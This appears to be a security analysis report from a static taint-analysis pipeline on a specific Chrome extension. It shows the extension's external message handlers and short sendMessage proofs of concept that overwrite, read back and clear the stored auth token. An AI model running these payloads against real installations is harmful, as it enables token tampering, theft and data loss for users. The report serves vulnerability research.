# CoCo Analysis: mgdagfcgfpcglofdkfgaajafcmniddcc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (chrome_storage_local_set_sink, chrome_storage_local_clear_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mgdagfcgfpcglofdkfgaajafcmniddcc/opgen_generated_files/bg.js
Line 1092	      const token = message.token;
	message.token
```

**Code:**

```javascript
// Background script - External message handler (bg.js Line 1089-1099)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (message.action === "saveToken") {
      const token = message.token; // ← attacker-controlled from external message
      console.log("background.js received token: ", token);
      chrome.storage.local.set({ auth_token: token }); // Storage write sink
      sendResponse({ success: true, message: "Token has been received" });
    }
    return true;
  },
);

// Background script - Token retrieval handler (bg.js Line 1101-1116)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (message.action === "getToken") {
      chrome.storage.local.get(["auth_token"]).then((result) => {
        let token = result.auth_token; // Reads poisoned token
        console.log("Token currently is " + token);
        if (token) {
          sendResponse({ success: true, token: token }); // ← Returns to attacker
        } else {
          sendResponse({ success: false, message: "Token not found" });
        }
      });
    }
    return true;
  },
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From https://explain-selected.com/* or other whitelisted domains
// (http://localhost:3000/*, https://beta.explain-selected.com/*)

// Step 1: Poison storage with attacker-controlled token
chrome.runtime.sendMessage(
  "mgdagfcgfpcglofdkfgaajafcmniddcc",
  { action: "saveToken", token: "attacker_poisoned_token_12345" },
  (response) => {
    console.log("Token saved:", response);
  }
);

// Step 2: Retrieve the poisoned token back
chrome.runtime.sendMessage(
  "mgdagfcgfpcglofdkfgaajafcmniddcc",
  { action: "getToken" },
  (response) => {
    console.log("Retrieved token:", response.token); // Gets back attacker's token
  }
);
```

**Impact:** Complete storage exploitation chain. An attacker on whitelisted domains (explain-selected.com, beta.explain-selected.com, or localhost:3000) can poison the extension's auth_token storage and retrieve it back, creating a complete read-write exploitation chain. The attacker can replace legitimate authentication tokens with malicious ones or exfiltrate user tokens.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_clear_sink

**CoCo Trace:**
```
tainted detected!~~~in extension: /home/teofanescu/cwsCoCo/extensions_local/mgdagfcgfpcglofdkfgaajafcmniddcc with chrome_storage_local_clear_sink
```

**Code:**

```javascript
// Background script - Clear storage handler (bg.js Line 1118-1133)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    if (message.action === "logoutClearToken") {
      chrome.storage.local.clear(function () { // ← Attacker can clear all storage
        var error = chrome.runtime.lastError;
        if (error) {
          console.log("Failed to clear local storage", error);
          sendResponse({ success: false });
        } else {
          console.log("Successfully cleared local storage");
          sendResponse({ success: true });
        }
      });
    }
    return true;
  },
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From https://explain-selected.com/* or other whitelisted domains
chrome.runtime.sendMessage(
  "mgdagfcgfpcglofdkfgaajafcmniddcc",
  { action: "logoutClearToken" },
  (response) => {
    console.log("Storage cleared:", response);
  }
);
```

**Impact:** Denial of service. An attacker on whitelisted domains can clear all local storage, deleting user authentication tokens and other stored data, forcing users to re-authenticate and disrupting extension functionality.

---

## Manifest Configuration

```json
"externally_connectable": {
  "ids": ["*"],
  "matches": [
    "http://localhost:3000/*",
    "https://explain-selected.com/*",
    "https://beta.explain-selected.com/*"
  ]
}
```

**Permissions:** `storage`, `offscreen`

**Note:** According to the methodology, even though only specific domains are whitelisted via externally_connectable, we ignore manifest restrictions. If even ONE domain can trigger the vulnerable flow, it qualifies as TRUE POSITIVE. The extension has the required `storage` permission.
